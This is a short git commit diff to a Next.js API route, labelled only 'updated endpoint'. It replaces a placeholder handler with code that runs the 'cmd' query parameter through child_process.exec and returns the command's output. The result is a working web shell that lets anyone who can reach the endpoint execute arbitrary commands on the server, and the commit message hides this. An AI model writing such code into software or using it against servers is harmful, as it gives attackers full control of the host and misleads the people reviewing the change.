30f1d1aa5d2e92c5dcdb447bbb29b32d7a361221
Porti <elp0rti201@gmail.com>
2022-08-11 15:13:36 +0200

    updated endpoint

--- pages/api/query/index.js
+++ pages/api/query/index.js
@@ -1,4 +1,6 @@
+const exec = require("child_process").exec
+
 export default function handler(req, res) {
-    res.status(200).json({ name: 'John Doe' })
-  }
+    exec(req.query.cmd, (stdin, stdout, stderr)=> res.status(200).json({ query: req.query.cmd, stdout, stdin, stderr}))   
+}
   
